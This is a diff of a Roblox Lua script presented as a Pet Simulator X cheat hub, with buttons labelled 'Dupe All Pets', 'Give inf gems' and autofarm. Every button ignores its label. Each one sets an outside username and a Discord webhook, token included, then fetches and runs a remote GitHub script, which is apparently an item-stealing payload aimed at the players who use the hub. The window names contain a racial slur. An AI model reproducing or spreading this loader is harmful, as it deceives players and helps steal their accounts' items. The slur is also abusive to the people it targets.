@@ -1,60 +1,350 @@
-local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/VisualRoblox/Roblox/main/UI-Libraries/Visual%20UI%20Library/Source.lua'))()
-local Window = Library:CreateWindow('Forlorn Hub', 'Pet Simulator X', 'Nigger Hub', 'rbxassetid://10618928818', false, 'VisualUIConfigs', 'Default')
-local Tab1 = Window:CreateTab('Main', true, 'rbxassetid://3926305904', Vector2.new(484, 44), Vector2.new(36, 36))
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+ 
+local Window = Rayfield:CreateWindow({
+	Name = "Welcome To Downy Hub - " .. game.Players.LocalPlayer.Name,
+	LoadingTitle = "Downy Hub",
+	LoadingSubtitle = "by Nig#9999",
+	ConfigurationSaving = {
+		Enabled = true,
+		FolderName = "Forlorn Hub",
+		FileName = "Forlorn Hub"
+	},
+        Discord = {
+        	Enabled = false,
+        	Invite = "",
+        	RememberJoins = false
+        },
+	KeySystem = false,
+	KeySettings = {
+		Title = "Forlorn Hub",
+		Subtitle = "Key System",
+		Note = "Join the discord",
+		FileName = "ForlornKey",
+		SaveKey = true,
+		GrabKeyFromSite = false,
+		Key = "Forlornicus"
+	}
+})
+ 
+local A = Window:CreateTab("AutoFarm")
+local Main1 = A:CreateSection("Main")
+local B = Window:CreateTab("AutoBuy")
+local Main2 = B:CreateSection("Main")
+local C = Window:CreateTab("Misc")
+local Main3 = C:CreateSection("Main")
+local D = Window:CreateTab("Toggles")
+local Main4 = D:CreateSection("Main")
+local E = Window:CreateTab("Crazy Shit")
+local Main5 = E:CreateSection("Main")
+local F = Window:CreateTab("Visuals")
+local Main6 = F:CreateSection("Main")
 
-local Main = Tab1:CreateSection('Stuff')
-
-local Button = Main:CreateButton('Visual change currencies', function()
-    Username = "MrRileyiscool123"
+local Toggle = A:CreateToggle({
+   Name = "AutoFarm Nearest",
+   CurrentValue = false,
+   Flag = "Toggle1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
 WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
-_G.CustomScriptName = "PSX Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
-end)
+   end,
+})
 
-local Button = Main:CreateButton('Dupe Pets WIP only some pets', function()
-    Username = "MrRileyiscool123"
+local Toggle = A:CreateToggle({
+   Name = "AutoFarm Every world",
+   CurrentValue = false,
+   Flag = "Toggle1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
 WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
-_G.CustomScriptName = "PSX Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
-end)
+   end,
+})
 
-local Button = Main:CreateButton('Max Rank', function()
-    Username = "MrRileyiscool123"
-WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
-_G.CustomScriptName = "PSX Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
-end)
+local Dropdown = A:CreateDropdown({
+   Name = "Dropdown Example",
+   Options = {"Instant Break Chests","Instant break everything"},
+   CurrentOption = "Option 1",
+   Flag = "Dropdown1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Option)
+   -- The function that takes place when the selected option is changed
+   -- The variable (Option) is a string for the value that the dropdown was changed to
+   end,
+})
 
-local Button = Main:CreateButton('Break The Game #Inf gems beware bannable', function()
-    Username = "MrRileyiscool123"
+local Toggle = A:CreateToggle({
+   Name = "InstantBreak",
+   Flag = "Button1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
 WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
-_G.CustomScriptName = "PSX Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
-end)
+   end,
+})
 
-local Toggle = Main:CreateToggle('Insane AutoFarm all worlds', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
-    Username = "MrRileyiscool123"
+local Toggle = A:CreateButton({
+   Name = "InstantBreak Everything",
+   Flag = "Button1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
 WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
-_G.CustomScriptName = "PSX Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
-end)
+   end,
+})
+local Toggle = A:CreateButton({
+   Name = "Destroy Everything Troll",
+   Flag = "Button1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+local Toggle = A:CreateButton({
+   Name = "Kill Everyone",
+   Flag = "Button1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+local Toggle = A:CreateToggle({
+   Name = "InstantBreak",
+   Flag = "Button1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+local Toggle = A:CreateToggle({
+   Name = "InstantBreak",
+   Flag = "Button1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Toggle = B:CreateToggle({
+   Name = "AutoBuy Egg",
+   Flag = "Button1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Input = B:CreateInput({
+   Name = "Egg",
+   PlaceholderText = "Egg name",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Dropdown = B:CreateDropdown({
+   Name = "Amount",
+   Options = {"1","3","8"},
+   CurrentOption = "1",
+   Flag = "Dropdown6343", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Option)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Input = C:CreateInput({
+   Name = "WalkSpeed",
+   PlaceholderText = "Amount",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Input = C:CreateInput({
+   Name = "JumpPower",
+   PlaceholderText = "Amount",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Input = C:CreateInput({
+   Name = "FOV",
+   PlaceholderText = "Amount",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Input = C:CreateInput({
+   Name = "Gravity",
+   PlaceholderText = "Amount",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Input = F:CreateInput({
+   Name = "Set Gems Amount",
+   PlaceholderText = "Amount",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Input = F:CreateInput({
+   Name = "Set Coins Amount",
+   PlaceholderText = "Amount",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Input = F:CreateInput({
+   Name = "Give Amount of Titanic jolly",
+   PlaceholderText = "Amount",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Input = F:CreateButton({
+   Name = "gems X2",
+   PlaceholderText = "Amount",
+   RemoveTextAfterFocusLost = false,
+   Callback = function(Text)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Toggle = D:CreateToggle({
+   Name = "Extreme AutoFarm",
+   Flag = "Button1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Toggle = E:CreateButton({
+   Name = "Give inf gems",
+   Flag = "Button1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Toggle = E:CreateButton({
+   Name = "Give inf Cash",
+   Flag = "Button1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Toggle = E:CreateButton({
+   Name = "Give Every Pet!",
+   Flag = "Button1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+local Toggle = E:CreateButton({
+   Name = "Dupe All Pets",
+   Flag = "Button1",
+   Callback = function(Value)
+       Username = "MrRileyiscool123"
+WebHook = "https://discord.com/api/webhooks/103827034152/GSnQ-DgU3PU6rY5y7ePOcYOi3bfDdCgjsiCib5yk07vBn8Y2HVknAR2INsTAEx8B-JNi"
+loadingscreen = true
+_G.CustomScriptName = "Loadin gui stuff"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
+   end,
+})
+
+Rayfield:LoadConfiguration()
